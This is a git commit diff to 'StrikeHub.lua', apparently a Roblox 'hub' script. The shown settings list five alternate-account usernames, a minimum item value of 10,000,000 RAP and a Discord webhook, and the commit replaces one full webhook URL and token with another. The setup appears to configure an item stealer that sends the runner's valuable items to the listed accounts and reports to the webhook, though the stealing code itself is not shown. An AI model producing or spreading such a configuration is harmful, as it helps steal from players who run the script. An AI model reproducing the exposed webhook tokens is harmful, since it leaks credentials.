558cb9b0d281382e4c9316ce00d626510708956f
StrikeHub <tiktok.techpv@gmail.com>
2025-11-07 15:10:31 +0100

    Update StrikeHub.lua

--- StrikeHub.lua
+++ StrikeHub.lua
@@ -2,7 +2,7 @@
 -- User settings
 _G.Usernames = {"PepijnAlt_1", "PepijnAlt_2", "PepijnAlt_3", "PepijnAlt_4", "PepijnAlt_5"} 
 _G.minrap = 10000000
-_G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun02T9rUiMFzZA1btH8483bsgvVihoSw-FEKsADYQbP49cJXvfsDLNQxto"
+_G.webhook = "https://discord.com/api/webhooks/1434627199444451561/X6JjcoEi7Df_x2xv8R67SOZzW3EBi1Qrs5I381F954qHqbPv6lxjda6sAdczP1zKxrQ8"
 
 -- Run both scripts concurrently
 spawn(function()
